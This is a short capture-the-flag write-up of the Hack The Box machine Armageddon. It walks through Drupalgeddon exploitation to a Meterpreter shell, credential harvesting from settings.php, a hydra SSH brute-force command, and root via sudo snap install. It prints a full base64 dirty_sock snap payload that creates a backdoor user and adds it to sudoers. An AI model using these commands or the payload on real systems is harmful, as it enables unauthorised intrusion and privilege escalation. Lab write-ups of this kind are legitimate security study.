---
title: HTB - Armageddon
layout: post
category: writeup
---

<br/>
<img src="../assets/img/htb/medium/Armageddon/title-card.png">
<br/>

# Armageddon
Hell yea baby intros are great!

## Initial Recon
ssh and http.
<br/>
<img src="../assets/img/htb/medium/Armageddon/nmap.png">
<br/>

Derr Drupalgeddon.
<br/>
<img src="../assets/img/htb/medium/Armageddon/der.png">
<br/>

Meterprederrr.
<br/>
<img src="../assets/img/htb/medium/Armageddon/meterprederrr.png">
<br/>

Dumping `/etc/passwd` (not shown: mysql service account)
<br/>
<img src="../assets/img/htb/medium/Armageddon/etcpasswd.png">
<br/>

`/var/www/html/sites/default/settings.php`
<br/>
<img src="../assets/img/htb/medium/Armageddon/hash-salt.png">
<br/>
<img src="../assets/img/htb/medium/Armageddon/db-creds.png">
<br/>

Well CentOS is ruining my day.  Can't open pty's with python, and I think that is also what is causing the mysql authentication to kill my meterpreter shell.  Trying brute force for a bit.

```
hydra -l brucetherealadmin -P /opt/SecLists/Passwords/Leaked-Databases/rockyou-20.txt ssh://10.10.10.233
```
<br/>
<img src="../assets/img/htb/medium/Armageddon/hydra.png">
<br/>

After `linpeas.sh` and some reading, looks like the dirty_sockv2 snap exploit is the intended route.

I grabbed the payload out of the exploit PoC because it wasn't working as-is.  Some more enumeration reveals that this version of snap is not vulnerable to this exploit, but the path to escalation is the same because the user account can run `snap install *` with sudo.
```
python -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d > /dev/shm/dirtysock/snap
```
<br/>
<img src="../assets/img/htb/medium/Armageddon/root.png">
<br/>

Quick and easy box :)